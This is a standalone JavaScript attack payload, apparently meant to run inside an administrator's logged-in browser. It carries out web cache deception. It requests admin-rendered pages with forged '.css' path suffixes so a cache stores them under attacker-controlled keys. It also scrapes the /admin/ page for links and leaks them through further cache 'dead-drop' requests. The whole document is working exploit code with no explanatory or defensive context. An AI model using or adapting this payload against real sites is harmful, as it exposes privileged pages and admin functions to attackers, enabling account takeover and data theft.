(async () => {
  const M = "886";
  const g = async (u) => { try { await fetch(u, {credentials:'include', cache:'no-store'}); } catch(e){} };
  // Dead-drop ADMIN-rendered root (WCD-cacheable) pages at markers I control.
  // Admin view of these may expose edit/seize controls invisible to anon.
  await g('/account.php/DDACCT_'+M+'.css');
  await g('/cases.php/DDCASES_'+M+'.css');
  await g('/tip.php/DDTIP_'+M+'.css');
  await g('/index.php/DDINDEX_'+M+'.css');
  // Also pull /admin/ as admin and re-expose its LINKS by hitting each discovered
  // same-origin href as a .css dead-drop (so anchor targets that ARE root pages get cached).
  try {
    const h = await (await fetch('/admin/', {credentials:'include'})).text();
    const hrefs = [...h.matchAll(/(?:href|action)=["']([^"']+)["']/gi)].map(m=>m[1]);
    let i=0;
    for (const href of hrefs) {
      if (/^https?:/i.test(href)) continue;            // same-origin only
      const path = href.startsWith('/') ? href : '/'+href;
      await g('/admin/__probe'+(i++)+'_'+M+'.css?to='+encodeURIComponent(path));
    }
    // Mark completion + href count via account dead-drop key length is fixed;
    // stash the count by hitting N distinct completion markers.
    for (let k=0;k<Math.min(hrefs.length,40);k++){ await g('/tip.php/DDLINK_'+M+'_'+k+'_'+encodeURIComponent(hrefs[k]).slice(0,40)+'.css'); }
  } catch(e){}
})();
